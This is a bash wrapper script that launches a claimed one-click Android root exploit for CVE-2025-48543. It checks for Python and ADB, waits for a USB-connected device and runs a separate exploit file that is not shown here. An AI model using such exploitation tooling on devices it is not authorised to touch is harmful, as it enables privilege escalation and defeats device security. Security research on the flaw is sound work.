#!/bin/bash

#############################################
# CVE-2025-48543 Quick Root Script
# One-click root for Android 13-16
#############################################

echo "╔════════════════════════════════════════╗"
echo "║   CVE-2025-48543 ANDROID ROOT EXPLOIT  ║"
echo "║         Quick Exploitation Tool         ║"
echo "╚════════════════════════════════════════╝"
echo ""

# Check if running as root (not needed but good to check)
if [ "$EUID" -eq 0 ]; then 
   echo "[!] Please do not run this script as root on your computer"
   exit 1
fi

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "[!] Python 3 not found. Installing..."
    sudo apt update && sudo apt install -y python3 python3-pip
fi

# Check ADB
if ! command -v adb &> /dev/null; then
    echo "[!] ADB not found. Please install Android SDK first."
    echo "Run: sudo apt install android-sdk-platform-tools"
    exit 1
fi

# Make scripts executable
chmod +x android_root_exploit.py
chmod +x build_and_deploy.sh

echo "[*] Starting automated exploitation..."
echo "[!] Make sure your Android device is connected with USB debugging enabled"
echo ""

# Wait for device
echo "[*] Waiting for device..."
adb wait-for-device

# Get device info
echo "[*] Device found!"
adb devices
echo ""

# Run the exploit
echo "[*] Launching exploit..."
python3 android_root_exploit.py --auto

echo ""
echo "[*] Exploitation attempt completed!"
echo "[*] If successful, you should now have root access"
echo ""
echo "To verify root access, run:"
echo "  adb shell"
echo "  su"
echo "  id"
echo ""